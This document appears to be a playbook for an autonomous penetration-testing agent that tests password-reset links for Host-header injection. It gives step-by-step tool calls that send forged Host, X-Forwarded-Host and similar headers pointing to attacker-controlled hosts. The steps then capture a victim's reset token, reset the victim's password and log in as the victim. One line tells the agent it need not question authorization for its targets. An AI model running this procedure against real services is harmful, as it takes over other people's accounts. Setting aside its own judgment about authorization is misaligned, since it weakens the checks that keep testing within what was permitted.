# C13_password_reset_host

Test password-reset link injection via the `Host`, `X-Forwarded-Host`, `X-Original-Host`, `Forwarded`, and `X-Host` HTTP headers. If the application constructs the reset URL from the incoming request's Host header rather than a hard-coded base URL, an attacker who can control the header can redirect the reset link to an attacker-controlled server and capture the victim's reset token. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface has a forgot-password / password-reset initiation endpoint.
- The application is behind a reverse proxy or load balancer that forwards `X-Forwarded-Host`.
- Recon shows the application builds absolute URLs (e.g. in email templates) using the request's host.
- Bug-class hints include `password-reset`, `host-header`, `header-injection`, or `account-takeover`.
- A victim email address is available in the auth registry or can be inferred from the signup flow.

---

## Workflow

1. **Load assignment and locate the reset initiation endpoint.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From traffic summary or recon, identify the POST endpoint that triggers the password-reset email. Common paths: `/forgot-password`, `/api/auth/forgot`, `/account/reset`, `/users/password`.

2. **Baseline reset request.**
   Submit a reset request for the attacker's own email without any Host injection — capture the reset link from the email or from the server response:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, auth_profile: "attacker", egress_profile })
   ```
   If the response body or a redirect URL contains a reset link, note the base URL used. If the link is emailed, use the attacker-controlled inbox to inspect it.

3. **Host header injection — direct.**
   Repeat the reset request with an injected `Host` header pointing to an attacker-controlled server:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "Host": "attacker-receiver.example.com" }, egress_profile })
   ```
   Inspect the collaborator endpoint for an inbound HTTP request containing a reset token in the URL path or query string.

4. **X-Forwarded-Host injection.**
   Many applications respect `X-Forwarded-Host` when behind a proxy:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "X-Forwarded-Host": "attacker-receiver.example.com" }, egress_profile })
   ```

5. **X-Original-Host injection.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "X-Original-Host": "attacker-receiver.example.com" }, egress_profile })
   ```

6. **Forwarded header injection (RFC 7239).**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "Forwarded": "host=attacker-receiver.example.com" }, egress_profile })
   ```

7. **X-Host injection.**
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "X-Host": "attacker-receiver.example.com" }, egress_profile })
   ```

8. **Dangling markup / partial injection.**
   Some frameworks only use part of the Host header. Test injection of characters that break the URL and redirect to attacker:
   - `Host: app.example.com@attacker.com`
   - `Host: app.example.com:attacker.com`
   - `Host: attacker.com/app.example.com`
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "attacker@example.com" }, headers: { "Host": "app.example.com@attacker.com" }, egress_profile })
   ```

9. **Victim email test (escalation).**
   After confirming injection with the attacker's own email, repeat with the victim's email address:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/forgot-password", body: { email: "victim@example.com" }, headers: { "X-Forwarded-Host": "attacker-receiver.example.com" }, egress_profile })
   ```
   If the collaborator receives an HTTP request with the victim's reset token, the ATO is proven.

10. **Confirm token usability.**
    Using the captured token, attempt to reset the victim's password to a known value:
    ```
    mantis_http_scan({ target_domain, method: "POST", path: "/api/auth/reset-password", body: { token: "VICTIM_RESET_TOKEN", password: "Mantis-Test-9!" }, egress_profile })
    ```
    Confirm a 200 response or a redirect to a logged-in session.

11. **Log coverage.**
    ```
    mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/auth/forgot-password", method: "POST", bug_class: "password_reset_host_injection", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "X-Forwarded-Host: attacker.com injected; collaborator received reset token for victim email" }] })
    ```

12. **Record chain attempt.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "host-header-ato", step: "victim_token_captured", evidence: "Victim reset token delivered to attacker.com via X-Forwarded-Host injection", outcome: "finding_recorded" })
    ```

13. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "Password-reset Host-header injection — account takeover", severity: "critical", cwe: "CWE-640", endpoint: "/api/auth/forgot-password", description: "...", proof_of_concept: "<injected header + collaborator callback with victim token + successful reset>", response_evidence: "...", impact: "Attacker captures victim's password-reset token and takes over account", validated: true })
    ```

14. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["Host-header ATO confirmed via X-Forwarded-Host", "Token is single-use; use immediately in verification"] })
    ```

15. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "fresh_token_capture", notes: "Re-trigger with fresh victim email; capture token at collaborator; reset password" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- The exact HTTP request including the injected header and victim email.
- The collaborator inbound HTTP request showing the reset URL with the token in the path or query string.
- The reset completion request (with the captured token) and the 200/204 response confirming the password was changed.
- Attacker login confirmation using the new password for the victim's account.

---

## Stop conditions

- Application constructs reset URL from a hard-coded `APP_BASE_URL` environment variable; Host header has no effect.
- Reverse proxy strips or normalizes `X-Forwarded-Host` before it reaches the application; all injected headers ignored.
- Reset URL contains a signed HMAC that binds the link to the original Host; altered host breaks the signature.
- Two consecutive test emails not received at collaborator — mail delivery confirmed via attacker-owned email only; stop victim-email test.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Partial URL injection.** If only the path portion of the reset link changes (not the host), it is not a token-theft vulnerability — it may be a different class of injection but not ATO.
- **Email not sent.** The server may return 200 without actually sending an email (e.g. if the email is unrecognized). Confirm with attacker's own email first before testing victim's email.
- **Token not in URL.** Some reset flows send a code via SMS or display it only in the authenticated browser session. If the token is not in the email link, this attack vector does not apply.
- **Rate limiting on forgot-password.** If the endpoint is rate-limited after a few requests, spread tests over multiple waves rather than hammering and getting WAF-blocked.

---

## Next chain

This is a specialized sub-playbook of **C12_account_takeover**. If Host-header injection is confirmed, feed directly into the **GRADE** phase. If token capture requires email delivery to an attacker-controlled mail server, also coordinate with **C9_ssrf_to_imds** (if mail server is an internal SMTP relay reachable via SSRF).
